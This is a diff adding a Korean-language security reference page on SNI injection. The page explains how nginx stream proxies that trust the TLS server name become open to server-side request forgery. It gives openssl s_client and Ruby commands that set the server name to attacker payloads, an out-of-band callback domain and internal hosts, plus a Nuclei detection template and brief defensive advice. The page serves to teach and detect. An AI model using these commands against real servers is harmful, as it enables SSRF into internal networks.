@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SNI Injection — PIXN</title>
+  <meta name="description" content="SNI Injection — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="SNI Injection — PIXN"><meta property="og:description" content="SNI Injection — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>SNI Injection</h1>
+      <time datetime="2023-03-09">MARCH 9, 2023</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<h3 id="sni">SNI</h3>
+<p>SNI(Server Name Indication)은 TLS의 확장 기능으로 handshake 과정 초기에 클라이언트가 어떤 호스트에 접속하는지 서버에게 알리는 역할을 수행합니다.</p>
+<blockquote>
+<p><a href="https://www.rfc-editor.org/rfc/rfc6066#page-6">RFC 6066</a></p>
+</blockquote>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/224069056-9f33ab3a-c75b-4fb3-85b5-2f91b16f77b0.png" alt="" /></p>
+<h3 id="sni-injection">SNI Injection</h3>
+<p>이러한 SNI 정보는 클라이언트와 서버간의 통신을 위해 Handshake하는 과정에서 사용되기 때문에 SNI 정보를 처리하거나 검증등에 활용하는 경우 일반적인 Injection 공격과 동일하게 임의의 데이터를 Inject할 수 있습니다. 대표적으로 활용되는 케이스는 아래와 같습니다.</p>
+<ul>
+<li>TLS를 사용하는 Application의 이상 동작을 유도 (Overflow, Crash)</li>
+<li>SNI를 처리하는 WAS나 Ingress의 특징을 이용하여 SSRF</li>
+</ul>
+<pre><code class="language-ruby hljs"><span class="hljs-comment"># SNI SSRF에 취약한 nginx 설정</span>
+stream <span class="hljs-punctuation">{</span>
+    server <span class="hljs-punctuation">{</span>
+        listen <span class="hljs-number">443</span><span class="hljs-punctuation">;</span> 
+        resolver <span class="hljs-number">127</span><span class="hljs-operator">.</span><span class="hljs-number">0</span><span class="hljs-operator">.</span><span class="hljs-number">0</span><span class="hljs-operator">.</span><span class="hljs-number">11</span><span class="hljs-punctuation">;</span>
+        proxy_pass <span class="hljs-variable">$ssl_preread_server_name</span><span class="hljs-punctuation">:</span><span class="hljs-number">443</span><span class="hljs-punctuation">;</span>       
+        ssl_preread on<span class="hljs-punctuation">;</span>
+    <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+
+<span class="hljs-comment"># 정규표현식을 통해 처리하는 경우에도 SNI를 통해 통제되지 않는 동작이 발생할 수 있음</span>
+stream <span class="hljs-punctuation">{</span>
+    map <span class="hljs-variable">$ssl_preread_server_name</span> <span class="hljs-variable">$targetBackend</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-operator">~</span><span class="hljs-operator">^</span>www<span class="hljs-operator">.</span>example<span class="hljs-punctuation">\</span><span class="hljs-operator">.</span>com    <span class="hljs-variable">$ssl_preread_server_name</span><span class="hljs-punctuation">;</span>
+    <span class="hljs-punctuation">}</span>  
+
+    server <span class="hljs-punctuation">{</span>
+        listen <span class="hljs-number">443</span><span class="hljs-punctuation">;</span> 
+        resolver <span class="hljs-number">127</span><span class="hljs-operator">.</span><span class="hljs-number">0</span><span class="hljs-operator">.</span><span class="hljs-number">0</span><span class="hljs-operator">.</span><span class="hljs-number">11</span><span class="hljs-punctuation">;</span>
+        proxy_pass <span class="hljs-variable">$targetBackend</span><span class="hljs-punctuation">:</span><span class="hljs-number">443</span><span class="hljs-punctuation">;</span>       
+        ssl_preread on<span class="hljs-punctuation">;</span>
+    <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>SNI Injection을 위해선 SNI 필드를 원하는 데이터로 수정할 수 있어야 합니다. Packet을 조작하여 전달하는 방법이 가장 깊은 레벨의 공격까지 진행할 수 있고, 일반적으론 도구를 사용해서 편집하는게 편리합니다.</p>
+<h4 id="openssl">OpenSSL</h4>
+<pre><code class="language-bash hljs">openssl s_client <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -connect target.com:443 <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -servername <span class="hljs-string">&quot;&lt;PAYLOAD&gt;&quot;</span> <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -crlf
+</code></pre>
+<p>openssl client를 통해 쉽게 SNI를 수정할 수 있습니다. -servername flag는 SNI 데이터를 지정하는 부분으로 해당 flag를 통해 공격 페이로드를 삽입하거나 아래와 같이 OOB를 유도하는 <a href="https://www.hahwul.com/cullinan/oast">OAST</a>를 통해 식별할 수 있습니다.</p>
+<pre><code class="language-bash hljs"><span class="hljs-comment"># OAST</span>
+openssl s_client <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -connect target.com:443 <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -servername <span class="hljs-string">&quot;ecoztid37w4o7gpy6wgzgvyify.odiss.eu&quot;</span> <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -crlf
+</code></pre>
+<h4 id="ruby">Ruby</h4>
+<p>Ruby, Python 등으로 쉽게 작성해서 테스트할 수 있습니다. 아래는 Ruby로 작성한 예시입니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-comment"># frozen_string_literal: true</span>
+
+<span class="hljs-built_in">require</span> <span class="hljs-string">&#39;net/http&#39;</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><span class="hljs-punctuation">(</span>url<span class="hljs-punctuation">,</span> sni<span class="hljs-punctuation">)</span>
+  uri <span class="hljs-operator">=</span> <span class="hljs-variable constant_">URI</span><span class="hljs-punctuation">(</span>url<span class="hljs-punctuation">)</span>
+
+  <span class="hljs-variable constant_">Net</span><span class="hljs-operator">::</span><span class="hljs-variable constant_">HTTP</span><span class="hljs-operator">.</span>start<span class="hljs-punctuation">(</span>uri<span class="hljs-operator">.</span>host<span class="hljs-punctuation">,</span> uri<span class="hljs-operator">.</span>port<span class="hljs-punctuation">,</span> <span class="hljs-symbol">use_ssl</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-symbol">ipaddr</span><span class="hljs-punctuation">:</span> sni<span class="hljs-punctuation">)</span> <span class="hljs-keyword">do</span> <span class="hljs-operator">|</span>http<span class="hljs-operator">|</span>
+    request <span class="hljs-operator">=</span> <span class="hljs-variable constant_">Net</span><span class="hljs-operator">::</span><span class="hljs-variable constant_">HTTP</span><span class="hljs-operator">::</span><span class="hljs-variable constant_">Get</span><span class="hljs-operator">.</span>new<span class="hljs-punctuation">(</span>uri<span class="hljs-punctuation">)</span>
+    response <span class="hljs-operator">=</span> http<span class="hljs-operator">.</span>request<span class="hljs-punctuation">(</span>request<span class="hljs-punctuation">)</span>
+
+    <span class="hljs-built_in">p</span> response<span class="hljs-operator">.</span>code
+    <span class="hljs-built_in">p</span> response<span class="hljs-operator">.</span>body
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+
+check<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;https://www.hahwul.com&#39;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&#39;internal.hahwul.com&#39;</span><span class="hljs-punctuation">)</span>
+check<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;https://www.hahwul.com&#39;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&#39;dalfox.hahwul.com&#39;</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h4 id="nuclei">Nuclei</h4>
+<p>tls-sni를 쉽게 수정하면서 테스트할 수 있도록 Nuclei에선 기능과 템플릿을 제공하고 있습니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-built_in">id</span><span class="hljs-punctuation">:</span> tls<span class="hljs-operator">-</span>sni<span class="hljs-operator">-</span>proxy
+
+<span class="hljs-symbol">info</span><span class="hljs-punctuation">:</span>
+  <span class="hljs-built_in">name</span><span class="hljs-punctuation">:</span> <span class="hljs-variable constant_">TLS</span> <span class="hljs-variable constant_">SNI</span> <span class="hljs-variable constant_">Proxy</span> <span class="hljs-variable constant_">Detection</span>
+  <span class="hljs-symbol">author</span><span class="hljs-punctuation">:</span> pdteam
+  <span class="hljs-symbol">severity</span><span class="hljs-punctuation">:</span> info
+  <span class="hljs-symbol">reference</span><span class="hljs-punctuation">:</span>
+    <span class="hljs-operator">-</span> <span class="hljs-symbol">https</span><span class="hljs-punctuation">:</span><span class="hljs-regexp">/</span><span class="hljs-regexp">/</span>www<span class="hljs-operator">.</span>invicti<span class="hljs-operator">.</span>com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span>web<span class="hljs-operator">-</span>security<span class="hljs-operator">/</span>ssrf<span class="hljs-operator">-</span>vulnerabilities<span class="hljs-operator">-</span>caused<span class="hljs-operator">-</span>by<span class="hljs-operator">-</span>sni<span class="hljs-operator">-</span>proxy<span class="hljs-operator">-</span>misconfigurations<span class="hljs-operator">/</span>
+    <span class="hljs-operator">-</span> <span class="hljs-symbol">https</span><span class="hljs-punctuation">:</span><span class="hljs-regexp">/</span><span class="hljs-regexp">/</span>www<span class="hljs-operator">.</span>bamsoftware<span class="hljs-operator">.</span>com<span class="hljs-operator">/</span>computers<span class="hljs-operator">/</span>sniproxy<span class="hljs-operator">/</span>
+  <span class="hljs-symbol">tags</span><span class="hljs-punctuation">:</span> ssrf<span class="hljs-punctuation">,</span>oast<span class="hljs-punctuation">,</span>tls<span class="hljs-punctuation">,</span>sni<span class="hljs-punctuation">,</span>proxy
+
+<span class="hljs-symbol">requests</span><span class="hljs-punctuation">:</span>
+  <span class="hljs-operator">-</span> <span class="hljs-symbol">raw</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-operator">-</span> <span class="hljs-operator">|</span>
+        <span class="hljs-variable">@tls</span><span class="hljs-operator">-</span><span class="hljs-symbol">sni</span><span class="hljs-punctuation">:</span> interactsh<span class="hljs-operator">-</span>url
+        <span class="hljs-variable constant_">GET</span> <span class="hljs-variable constant_">HTTP</span><span class="hljs-operator">/</span><span class="hljs-number">1</span><span class="hljs-operator">.</span><span class="hljs-number">1</span>
+        <span class="hljs-symbol">Host</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span><span class="hljs-variable constant_">Hostname</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+    <span class="hljs-symbol">matchers</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-operator">-</span> <span class="hljs-symbol">type</span><span class="hljs-punctuation">:</span> word
+        <span class="hljs-symbol">part</span><span class="hljs-punctuation">:</span> interactsh_protocol <span class="hljs-comment"># Confirms the DNS Interaction</span>
+        <span class="hljs-symbol">words</span><span class="hljs-punctuation">:</span>
+          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;</span><span class="hljs-string">dns</span><span class="hljs-string">&quot;</span>
+</code></pre>
+<p><em>[https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/tls-sni-proxy.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/tls-sni-proxy.yaml</em></p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Injection 공격은 공격자가 어떤 액션을 목적으로 하고 어떤 코드를 사용하고, 대상에 어떤 취약점이 있느냐에 따라서 여러가지 형태로 나타나지만 가장 잘 알려진 공격은 SSRF 입니다.</p>
+<h4 id="ssrf">SSRF</h4>
+<pre><code class="language-bash hljs"><span class="hljs-comment"># SSRF via SNI</span>
+openssl s_client <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -connect target.com:443 <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -servername <span class="hljs-string">&quot;internal.inhouse.domain&quot;</span> <span class="hljs-string">\
+</span><span class="hljs-string"></span>  -crlf
+</code></pre>
+<p>아까 위에서 이야기했던 Ruby 코드를 가지고 예시로 작성해보면 이렇습니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-built_in">require</span> <span class="hljs-string">&#39;net/http&#39;</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><span class="hljs-punctuation">(</span>url<span class="hljs-punctuation">,</span> sni<span class="hljs-punctuation">)</span>
+  uri <span class="hljs-operator">=</span> <span class="hljs-variable constant_">URI</span><span class="hljs-punctuation">(</span>url<span class="hljs-punctuation">)</span>
+
+  <span class="hljs-variable constant_">Net</span><span class="hljs-operator">::</span><span class="hljs-variable constant_">HTTP</span><span class="hljs-operator">.</span>start<span class="hljs-punctuation">(</span>uri<span class="hljs-operator">.</span>host<span class="hljs-punctuation">,</span> uri<span class="hljs-operator">.</span>port<span class="hljs-punctuation">,</span> <span class="hljs-symbol">use_ssl</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-symbol">ipaddr</span><span class="hljs-punctuation">:</span> sni<span class="hljs-punctuation">)</span> <span class="hljs-keyword">do</span> <span class="hljs-operator">|</span>http<span class="hljs-operator">|</span>
+    request <span class="hljs-operator">=</span> <span class="hljs-variable constant_">Net</span><span class="hljs-operator">::</span><span class="hljs-variable constant_">HTTP</span><span class="hljs-operator">::</span><span class="hljs-variable constant_">Get</span><span class="hljs-operator">.</span>new<span class="hljs-punctuation">(</span>uri<span class="hljs-punctuation">)</span>
+    response <span class="hljs-operator">=</span> http<span class="hljs-operator">.</span>request<span class="hljs-punctuation">(</span>request<span class="hljs-punctuation">)</span>
+
+    <span class="hljs-built_in">p</span> response<span class="hljs-operator">.</span>code
+    <span class="hljs-built_in">p</span> response<span class="hljs-operator">.</span>body
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+
+check<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;https://public.target.com/server-status&#39;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&#39;internal.service&#39;</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>웹 요청은 아래와 같이 발생하지만 실제 연결되는 도메인은 internal.service로 proxy_pass 등이 오 설정된 경우 공격자가 원하는 도메인으로 요청을 발생 시킬 수 있습니다.</p>
+<pre><code>GET /server-status HTTP/1.1
+</code></pre>
+<h4 id="with-crlf-injection">With CRLF Injection</h4>
+<p>BlackHat 문서 중 유명한 Era of SSRF를 보면 SNI Injection 에 대한 내용도 있습니다. Mail Injection에도 충분히 사용될 수 있으니 잘 알아두시는게 좋을 것 같네요 :D</p>
+<blockquote>
+<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">Era of SSRF</a></p>
+</blockquote>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/224065525-c7227087-5c74-4618-a756-2ec8a9f27363.png" alt="" /></p>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/224065535-ae0ab76d-d299-44d0-a6ab-db6518617d3b.png" alt="" /></p>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>실제 Application에서 직접 TLS를 다루는 경우는 적습니다. 관련 라이브러리 또는 WAS, Ingress 등의 설정에서 SNI를 신뢰하는지, 어떻게 처리하는지 확인하고 위와 같은 경우들이 발생하지 않도록 규칙이나 정규표현식 등을 정확하게 설정해야 합니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>https://github.com/tls-attacker/TLS-Attacker</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/">https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/</a></li>
+<li><a href="https://gist.github.com/kekru/c09dbab5e78bf76402966b13fa72b9d2#choose-upstream-based-on-domain-pattern">https://gist.github.com/kekru/c09dbab5e78bf76402966b13fa72b9d2#choose-upstream-based-on-domain-pattern</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6066#page-6">https://www.rfc-editor.org/rfc/rfc6066#page-6</a></li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/sni-injection/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
